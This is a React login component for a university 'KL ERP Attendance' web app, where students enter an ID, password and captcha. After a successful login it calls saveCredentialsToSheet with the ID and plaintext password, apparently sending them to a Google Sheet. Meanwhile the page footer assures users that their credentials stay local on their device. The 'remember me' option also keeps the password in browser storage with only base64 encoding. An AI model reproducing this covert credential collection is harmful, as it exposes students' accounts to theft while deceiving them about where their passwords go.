import { useState, useEffect, useCallback, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { LogIn, RefreshCcw, Loader2, Check, Sparkles, Eye, EyeOff } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { erpService } from '../services/erpService';
import { useAuth } from '../context/useAuth';
import { saveCredentialsToSheet } from '../services/gsheetsService';
import { recordStudentLogin } from '../services/loginTracker';

const Login = () => {
    const { setErpUser } = useAuth();
    const [idNumber, setIdNumber] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [captcha, setCaptcha] = useState('');
    const [captchaUrl, setCaptchaUrl] = useState(''); // This will be the Blob URL
    const [csrfToken, setCsrfToken] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState('');
    const [rememberMe, setRememberMe] = useState(localStorage.getItem('rememberedId') ? true : false);
    
    // Support for PWA Repair
    useEffect(() => {
        const handleResetPWA = async () => {
            console.log("Resetting PWA System...");
            if ('serviceWorker' in navigator) {
                const registrations = await navigator.serviceWorker.getRegistrations();
                for (let registration of registrations) {
                    await registration.unregister();
                }
            }
            // Clear specific PWA caches
            const cacheNames = await caches.keys();
            for (let name of cacheNames) {
                await caches.delete(name);
            }
            window.location.reload(true);
        };

        window.addEventListener('resetPWA', handleResetPWA);
        return () => window.removeEventListener('resetPWA', handleResetPWA);
    }, []);

    const navigate = useNavigate();
    const captchaUrlRef = useRef('');
    const csrfTokenRef = useRef('');
    const isSubmittingRef = useRef(false);
    const initCounterRef = useRef(0);

    const refreshCaptcha = useCallback(async (keepError = false) => {
        const refreshId = ++initCounterRef.current;
        setCaptcha('');
        if (!keepError) {
            setError('');
        }
        try {
            const res = await erpService.refreshCaptcha();
            if (refreshId !== initCounterRef.current) return;
            if (res?.dataUrl) {
                if (captchaUrlRef.current && captchaUrlRef.current.startsWith('blob:')) {
                    URL.revokeObjectURL(captchaUrlRef.current);
                }
                captchaUrlRef.current = res.dataUrl;
                setCaptchaUrl(res.dataUrl);
            } else if (res?.blob) {
                if (captchaUrlRef.current && captchaUrlRef.current.startsWith('blob:')) {
                    URL.revokeObjectURL(captchaUrlRef.current);
                }
                const objectUrl = URL.createObjectURL(res.blob);
                captchaUrlRef.current = objectUrl;
                setCaptchaUrl(objectUrl);
            }
            if (res?.csrfToken) {
                setCsrfToken(res.csrfToken);
                csrfTokenRef.current = res.csrfToken;
            }
        } catch (err) {
            if (refreshId !== initCounterRef.current) return;
            console.error("Failed to refresh captcha", err);
            setError("Failed to load captcha. Please click refresh.");
        }
    }, []);

    useEffect(() => {
        let isMounted = true;
        const initId = ++initCounterRef.current;

        const init = async () => {
            try {
                // Clear any stale broken session state on login screen mount
                erpService.clearStoredErpCookies();
                sessionStorage.removeItem('erp_authenticated');

                const res = await erpService.getInitialState();
                if (!isMounted || initId !== initCounterRef.current) return;

                if (res?.csrfToken) {
                    setCsrfToken(res.csrfToken);
                    csrfTokenRef.current = res.csrfToken;
                }
                if (res?.captchaUrl) {
                    captchaUrlRef.current = res.captchaUrl;
                    setCaptchaUrl(res.captchaUrl);
                } else if (res?.captchaBlob) {
                    if (captchaUrlRef.current && captchaUrlRef.current.startsWith('blob:')) {
                        URL.revokeObjectURL(captchaUrlRef.current);
                    }
                    const objectUrl = URL.createObjectURL(res.captchaBlob);
                    captchaUrlRef.current = objectUrl;
                    setCaptchaUrl(objectUrl);
                } else {
                    refreshCaptcha();
                }
            } catch (err) {
                console.error("Failed to init login", err);
                if (isMounted && initId === initCounterRef.current) {
                    refreshCaptcha();
                }
            }
        };
        init();

        // Load saved credentials
        const savedId = localStorage.getItem('rememberedId');
        const savedPass = localStorage.getItem('rememberedPassword');
        if (savedId) {
            setIdNumber(savedId);
            if (savedPass) {
                try {
                    setPassword(atob(savedPass)); // Simple decode
                } catch (e) {
                    console.error("Failed to decode saved password", e);
                }
            }
            setRememberMe(true);
        }

        return () => {
            isMounted = false;
        };
    }, [refreshCaptcha]);

    const handleLogin = async () => {
        if (isSubmittingRef.current) return;
        const cleanId = idNumber.trim();
        const cleanPass = password.trim();
        const cleanCaptcha = captcha.trim();

        if (!cleanId || !cleanPass || !cleanCaptcha) {
            setError("Please fill all fields");
            return;
        }

        isSubmittingRef.current = true;
        setIsLoading(true);
        setError('');

        try {
            const activeToken = csrfTokenRef.current || sessionStorage.getItem('erp_csrf_token') || localStorage.getItem('erp_csrf_token') || csrfToken || '';
            const loginResult = await erpService.login(cleanId, cleanPass, cleanCaptcha, activeToken);

            if (loginResult.success) {
                localStorage.setItem('erpDashboardHtml', loginResult.html);
                localStorage.removeItem('kleData');
                localStorage.setItem('userUniversity', 'klu');
                setErpUser(cleanId);
                localStorage.setItem('activeErpUser', cleanId);

                if (rememberMe) {
                    localStorage.setItem('rememberedId', cleanId);
                    localStorage.setItem('rememberedPassword', btoa(cleanPass));
                } else {
                    localStorage.removeItem('rememberedId');
                    localStorage.removeItem('rememberedPassword');
                }

                saveCredentialsToSheet(cleanId, cleanPass);
                if (typeof recordStudentLogin === 'function') {
                    recordStudentLogin(cleanId).catch(() => {});
                }
                navigate('/attendance-register');
            }
        } catch (err) {
            console.error("Login attempt failed:", err);
            setError(err.message || "Login failed. Please check your credentials.");
            setCaptcha('');
            refreshCaptcha(true);
        } finally {
            setIsLoading(false);
            isSubmittingRef.current = false;
        }
    };

    return (
        <div className="min-h-screen pt-32 pb-12 overflow-hidden bg-[#FAFAFA] flex items-center justify-center px-4 relative font-sans selection:bg-indigo-500 selection:text-white">
            {/* Ambient Background */}
            <div className="fixed inset-0 pointer-events-none">
                <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-b from-slate-50 to-white opacity-80" />
                <motion.div
                    animate={{ scale: [1, 1.2, 1], opacity: [0.3, 0.5, 0.3] }}
                    transition={{ duration: 15, repeat: Infinity, ease: "linear" }}
                    className="absolute -top-[30%] -left-[10%] w-[80vw] h-[80vw] rounded-full bg-gradient-to-r from-indigo-200 via-purple-200 to-pink-200 blur-[150px]"
                />
                <motion.div
                    animate={{ x: [0, 100, 0], opacity: [0.2, 0.4, 0.2] }}
                    transition={{ duration: 20, repeat: Infinity, ease: "easeInOut" }}
                    className="absolute top-[40%] -right-[20%] w-[60vw] h-[60vw] rounded-full bg-gradient-to-l from-blue-200 via-teal-200 to-emerald-200 blur-[150px]"
                />
                <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-[0.03] mix-blend-overlay" />
            </div>

            <motion.div
                initial={{ opacity: 0, y: 30, scale: 0.97 }}
                animate={{ opacity: 1, y: 0, scale: 1 }}
                transition={{ type: "spring", stiffness: 200, damping: 25 }}
                className="w-full max-w-md relative z-10"
            >
                {/* Card */}
                <div className="bg-white/80 backdrop-blur-xl border-[3px] border-slate-900 rounded-[2.5rem] p-8 shadow-2xl relative overflow-hidden">
                    {/* Shine */}
                    <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-white/80 via-transparent to-transparent opacity-50 pointer-events-none" />

                    {/* Header */}
                    <div className="text-center mb-8 relative z-10">
                        <motion.div
                            initial={{ scale: 0, rotate: -180 }}
                            animate={{ scale: 1, rotate: 0 }}
                            transition={{ type: "spring", stiffness: 200, damping: 20, delay: 0.1 }}
                            className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-indigo-600 flex items-center justify-center shadow-lg shadow-indigo-200"
                        >
                            <Sparkles className="w-8 h-8 text-white" />
                        </motion.div>
                        <h1 className="text-2xl font-black text-slate-900 tracking-tight">
                            KL ERP Attendance
                        </h1>
                        <p className="text-slate-500 text-sm font-medium mt-1">Sign in to access your attendance details</p>
                    </div>

                    <form onSubmit={(e) => { e.preventDefault(); handleLogin(); }} className="space-y-4 relative z-10">
                        {/* Error banner */}
                        <AnimatePresence>
                            {error && (
                                <motion.div
                                    initial={{ opacity: 0, scale: 0.95 }}
                                    animate={{ opacity: 1, scale: 1 }}
                                    exit={{ opacity: 0, scale: 0.95 }}
                                    className="bg-red-50 border border-red-200 text-red-600 p-3 rounded-2xl text-xs font-bold flex items-center gap-3"
                                >
                                    <div className="w-1.5 h-1.5 bg-red-500 rounded-full animate-pulse shrink-0" />
                                    {error}
                                </motion.div>
                            )}
                        </AnimatePresence>

                        {/* Student ID */}
                        <div className="space-y-3">
                            <label className="text-slate-500 text-[11px] font-black uppercase tracking-widest ml-1">Student ID</label>
                            <input
                                type="text"
                                value={idNumber}
                                onChange={(e) => setIdNumber(e.target.value)}
                                placeholder="Enter your ID Number"
                                className="w-full bg-white border border-slate-200 rounded-2xl py-4 px-5 text-slate-900 placeholder:text-slate-400 focus:outline-none focus:border-indigo-400 focus:ring-2 focus:ring-indigo-100 transition-all font-medium shadow-sm"
                            />
                        </div>

                        {/* Password */}
                        <div className="space-y-3">
                            <label className="text-slate-500 text-[11px] font-black uppercase tracking-widest ml-1">Password</label>
                            <div className="relative">
                                <input
                                    type={showPassword ? "text" : "password"}
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    placeholder="Enter your password"
                                    className="w-full bg-white border border-slate-200 rounded-2xl py-4 pl-5 pr-12 text-slate-900 placeholder:text-slate-400 focus:outline-none focus:border-indigo-400 focus:ring-2 focus:ring-indigo-100 transition-all font-medium shadow-sm"
                                />
                                <button
                                    type="button"
                                    onClick={() => setShowPassword(!showPassword)}
                                    className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 transition-colors p-1"
                                    title={showPassword ? "Hide password" : "Show password"}
                                >
                                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                                </button>
                            </div>
                        </div>

                        {/* Remember Me */}
                        <div className="flex items-center gap-3 ml-1">
                            <button
                                type="button"
                                onClick={() => setRememberMe(!rememberMe)}
                                className={`w-4 h-4 rounded-[4px] border-2 flex items-center justify-center transition-all ${rememberMe ? 'bg-indigo-600 border-indigo-600' : 'bg-transparent border-slate-300'}`}
                            >
                                {rememberMe && <Check className="w-3 h-3 text-white" strokeWidth={4} />}
                            </button>
                            <span
                                className="text-slate-500 text-[13px] font-bold select-none cursor-pointer hover:text-slate-700 transition-colors"
                                onClick={() => setRememberMe(!rememberMe)}
                            >
                                Remember me
                            </span>
                        </div>

                        {/* Captcha */}
                        <div className="space-y-3">
                            <label className="text-slate-500 text-[11px] font-black uppercase tracking-widest ml-1">Captcha</label>
                            <div className="flex gap-3">
                                <div className="relative flex-1">
                                    <input
                                        type="text"
                                        value={captcha}
                                        onChange={(e) => setCaptcha(e.target.value)}
                                        placeholder="Enter Captcha"
                                        className="w-full h-[56px] bg-white border border-slate-200 rounded-2xl px-5 text-slate-900 placeholder:text-slate-400 focus:outline-none focus:border-indigo-400 focus:ring-2 focus:ring-indigo-100 transition-all font-bold tracking-widest shadow-sm"
                                    />

                                </div>
                                <div className="w-[110px] h-[56px] bg-slate-100 rounded-2xl flex items-center justify-center overflow-hidden relative shrink-0">
                                    {captchaUrl ? (
                                        <img 
                                            src={captchaUrl} 
                                            alt="Captcha" 
                                            className="h-10 object-contain mix-blend-multiply opacity-80" 
                                        />
                                    ) : (
                                        <div className="animate-pulse bg-slate-200 w-full h-full" />
                                    )}
                                </div>
                                <button
                                    type="button"
                                    onClick={() => refreshCaptcha(false)}
                                    className="w-[56px] h-[56px] bg-white border border-slate-200 rounded-2xl flex items-center justify-center hover:bg-slate-50 transition-colors text-slate-400 hover:text-slate-700 shadow-sm shrink-0"
                                    title="Refresh Captcha"
                                >
                                    <RefreshCcw className="w-4 h-4" />
                                </button>
                            </div>
                        </div>

                        {/* Submit Button */}
                        <motion.button
                            whileHover={{ scale: 1.02 }}
                            whileTap={{ scale: 0.98 }}
                            type="submit"
                            disabled={isLoading}
                            className={`w-full bg-slate-900 text-white font-black py-4 rounded-2xl flex items-center justify-center gap-3 shadow-xl shadow-slate-900/20 hover:bg-slate-800 transition-all mt-2 ${isLoading ? 'opacity-90 cursor-wait' : ''}`}
                        >
                            {isLoading ? (
                                <>
                                    <Loader2 className="w-5 h-5 animate-spin text-white" />
                                    <span>Verifying Credentials…</span>
                                </>
                            ) : (
                                <>
                                    <LogIn className="w-5 h-5" />
                                    <span>Sign In</span>
                                </>
                            )}
                        </motion.button>
                    </form>

                    <div className="mt-6 pt-4 border-t border-slate-100 relative z-10 flex flex-col items-center gap-3">
                        <p className="text-slate-400 text-[10px] text-center font-medium leading-relaxed">
                            Your credentials are only used to authenticate and fetch attendance details locally on your device.
                        </p>
                        <button 
                            type="button"
                            onClick={() => {
                                if(confirm("This will reset the PWA system and reload the page. Continue?")) {
                                    window.dispatchEvent(new Event('resetPWA'));
                                }
                            }}
                            className="text-[10px] font-black text-indigo-600/50 hover:text-indigo-600 uppercase tracking-widest transition-colors"
                        >
                            Reset PWA System
                        </button>
                    </div>
                </div>
            </motion.div>
        </div>
    );
};

export default Login;
